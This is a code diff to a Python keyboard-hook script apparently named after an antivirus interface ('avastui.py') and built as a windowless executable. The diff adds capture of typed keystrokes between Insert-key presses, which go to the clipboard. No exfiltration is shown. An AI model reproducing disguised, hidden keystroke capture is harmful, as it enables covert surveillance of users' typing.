@@ -13,6 +13,8 @@ import pyautogui as pya
 from cryptography.fernet import Fernet
 # import json
 
+import time
+
 # https://www.geeksforgeeks.org/convert-python-script-to-exe-file/
 # pip install pyinstaller
 # pyinstaller --onefile -w 'avastui.py'
@@ -85,26 +87,43 @@ def on_press(key):
     #     print('special key {0} pressed'.format(
     #         key))
     global insertPressed
+    global start
+    global keyboardString
+    if insertPressed == 1:
+        if key == keyboard.Key.backspace:
+            print('backspace')
+            keyboardString = str(keyboardString).replace("'", "").replace("Key.space", " ").replace("Key.shift_r", "").replace("Key.shift_l", "").replace("Key.insert", "")
+            keyboardString = keyboardString[:-1]
+        else:
+            print('other key')
+            keyboardString += str(key)
     if key == keyboard.Key.insert:
         insertPressed += 1
+        if insertPressed == 1:
+            start = time.perf_counter()
         if insertPressed == 2:
-            insertPressed = 0
-            # root = Tk()
-            # root.withdraw()
-            # root.clipboard_clear()
-            # root.clipboard_append(str(insertPressed))
-            # root.update()
-            pya.hotkey("ctrl", "c") # copy the text (simulating key strokes)
-
+            stop = time.perf_counter()
+            if stop - start < 1:
+                pya.hotkey("ctrl", "c") # copy the text (simulating key strokes)
+                insertPressed = 0
+            if stop - start > 1:
+                root = Tk()
+                root.withdraw()
+                root.clipboard_clear()
+                keyboardString = str(keyboardString).replace("'", "").replace("Key.space", " ").replace("Key.shift_r", "").replace("Key.shift_l", "").replace("Key.insert", "")
+                print('keyboardString: ' + keyboardString)
+                root.clipboard_append(str(keyboardString))
+                root.update()
+                keyboardString = ""
+                insertPressed = 0
 
 def on_release(key):
     return True
     # print('key released')
-# print('{0} released'.format(
-#     key))
-# if key == keyboard.Key.esc:
-#     # Stop listener
-#     return False
+    # print('{0} released'.format(key))
+    # if key == keyboard.Key.insert:
+    #     # Stop listener
+    #     return False
 
 # https://stackoverflow.com/questions/2490334/simple-way-to-encode-a-string-according-to-a-password
 def encrypt(message: bytes, key: bytes) -> bytes:
@@ -123,6 +142,9 @@ args = parser.parse_args()
 # print(args)
 
 insertPressed = 0
+start = time.perf_counter()
+keyboardString = ""
+
 
 # Collect events until released
 # with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
